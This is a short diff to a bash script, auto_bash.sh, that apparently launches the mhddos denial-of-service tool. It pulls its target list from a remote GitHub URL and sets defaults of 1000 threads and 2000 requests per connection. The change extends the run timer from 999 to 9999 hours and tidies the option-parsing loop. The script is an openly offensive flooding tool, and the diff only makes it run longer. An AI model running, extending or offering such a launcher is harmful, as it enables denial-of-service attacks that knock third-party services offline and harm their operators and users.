@@ -7,7 +7,7 @@ usage: ./auto_bash.sh [-t|-r|--table]
                         [-t THREADS]      (default = 1000)
                         [-r RPC]          (default = 2000)
                         [--table]         (default = off)
-                        [-k HOURS]        (defaul  = 999)
+                        [-k HOURS]        (defaul  = 9999)
                         [-h]              show this menu
 EOF
 }
@@ -62,14 +62,13 @@ done
 target_url="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
 
 SECONDS=0
-KILL_TIME=999
+KILL_TIME=9999
 threads="-t 1000"
 rpc="--rpc 2000"
 debug="--debug"
 table=""
 
-while [ "$1" != "" ]
-do
+while [ "$1" != "" ]; do
     case $1 in
       -t | --threads )   threads="-t $2"; shift 2;;
       -r | --rpc )    rpc="--rpc $2";  shift 2  ;;
